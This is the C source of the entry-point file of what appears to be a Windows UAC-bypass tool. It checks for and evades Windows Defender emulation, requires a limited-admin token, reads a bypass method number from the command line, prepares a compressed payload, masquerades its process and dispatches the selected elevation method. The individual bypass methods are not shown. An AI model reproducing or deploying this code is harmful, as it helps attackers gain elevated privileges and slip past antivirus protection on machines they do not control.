/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2022
*
*  TITLE:       MAIN.C
*
*  VERSION:     3.61
*
*  DATE:        22 Jun 2022
*
*  Program entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#define OEMRESOURCE
#include "global.h"
#pragma comment(lib, "comctl32.lib")

//Runtime context global variable
PUACMECONTEXT g_ctx;

//Image Base Address global variable
HINSTANCE g_hInstance;

/*
* ucmInit
*
* Purpose:
*
* Prestart phase with MSE / Windows Defender anti-emulation part.
*
* Note:
*
* supHeapAlloc unavailable during this routine and calls from it.
*
*/
NTSTATUS ucmInit(
    _Inout_ UCM_METHOD *RunMethod,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_ ULONG OptionalParameterLength
)
{
    UCM_METHOD  Method;
    LPWSTR      optionalParameter = NULL;
    ULONG       optionalParameterLength = 0;

#ifndef _DEBUG
    TOKEN_ELEVATION_TYPE    ElevType;
#endif	

    ULONG bytesIO;
    WCHAR szBuffer[MAX_PATH + 1];

    wdCheckEmulatedVFS();

    ucmConsoleInit();

    bytesIO = 0;
    RtlQueryElevationFlags(&bytesIO);
    if ((bytesIO & DBG_FLAG_ELEVATION_ENABLED) == 0)
        return STATUS_ELEVATION_REQUIRED;

    if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
        return STATUS_INTERNAL_ERROR;

    InitCommonControls();

    if (g_hInstance == NULL)
        g_hInstance = (HINSTANCE)NtCurrentPeb()->ImageBaseAddress;

    if (*RunMethod == UacMethodInvalid) {

        bytesIO = 0;
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
        if (bytesIO == 0) {
            return STATUS_INVALID_PARAMETER;
        }

        Method = (UCM_METHOD)_strtoul(szBuffer);
        *RunMethod = Method;

    }
    else {
        Method = *RunMethod;
    }

#ifndef _DEBUG
    if (Method == UacMethodTest)
        return STATUS_INVALID_PARAMETER;
#endif
    if (Method >= UacMethodMax)
        return STATUS_INVALID_PARAMETER;

#ifndef _DEBUG
    ElevType = TokenElevationTypeDefault;
    if (supGetElevationType(&ElevType)) {
        if (ElevType != TokenElevationTypeLimited) {
            return STATUS_NOT_SUPPORTED;
        }
    }
    else {
        return STATUS_INTERNAL_ERROR;
    }
#endif

    //
    // Process optional parameter.
    //
    if ((OptionalParameter == NULL) || (OptionalParameterLength == 0)) {

        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        bytesIO = 0;
        GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &bytesIO);
        if (bytesIO > 0) {
            optionalParameter = (LPWSTR)&szBuffer;
            optionalParameterLength = bytesIO;
        }

    }
    else {
        optionalParameter = OptionalParameter;
        optionalParameterLength = OptionalParameterLength;
    }

    g_ctx = (PUACMECONTEXT)supCreateUacmeContext(Method,
        optionalParameter,
        optionalParameterLength,
        supEncodePointer(DecompressPayload));

    if (g_ctx == NULL)
        return STATUS_FATAL_APP_EXIT;

    return STATUS_SUCCESS;
}

/*
* ucmMain
*
* Purpose:
*
* Program entry point.
*
*/
NTSTATUS WINAPI ucmMain(
    _In_ UCM_METHOD Method,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_ ULONG OptionalParameterLength
)
{
    NTSTATUS Status;
    UCM_METHOD method = Method;

    Status = ucmInit(&method,
        OptionalParameter,
        OptionalParameterLength);

    ucmConsolePrintStatus(TEXT("[*] ucmInit"), Status);

    if (!NT_SUCCESS(Status))
        return Status;

    supMasqueradeProcess(FALSE);

    return MethodsManagerCall(method);
}

/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
#pragma comment(linker, "/ENTRY:main")
VOID __cdecl main()
{
#ifdef _UCM_CONSOLE
    ULONG result;

    result = StubInit(ucmMain);
    ucmConsolePrintValueUlong(TEXT("[+] ucmMain"), result, TRUE);
    ucmConsoleRelease();
    ExitProcess(result);

#else
    ExitProcess(StubInit(ucmMain));
#endif
}
